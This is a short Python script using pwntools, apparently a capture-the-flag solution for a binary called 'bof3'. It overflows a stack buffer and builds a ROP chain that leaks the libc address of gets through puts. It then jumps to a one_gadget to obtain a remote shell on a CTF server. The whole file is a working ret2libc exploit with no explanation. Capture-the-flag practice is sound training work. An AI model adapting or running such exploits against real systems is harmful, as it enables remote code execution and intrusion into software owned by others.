#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
elf = pwn.ELF('./bof3')
libc = pwn.ELF('./libc.so.6')

rop = pwn.ROP(elf)

payload = b'A' * 16 + pwn.p64(rop.rdi.address) + pwn.p64(elf.got[b'gets']) + pwn.p64(elf.plt[b'puts']) + pwn.p64(elf.sym[b'main'])

rem = pwn.remote('csie.ctf.tw', 10127)
rem.sendline(payload)
rem.recvline()
gets_addr = pwn.u64(rem.recv(6).ljust(8, b'\x00'))
rem.recvline()
one_gadget = 0x10a38c
libc_addr = gets_addr - libc.symbols[b'gets']
shell_addr = libc_addr + one_gadget

payload = b'A' * 16 + pwn.p64(shell_addr)
rem.sendline(payload)
rem.recvline()

rem.interactive()

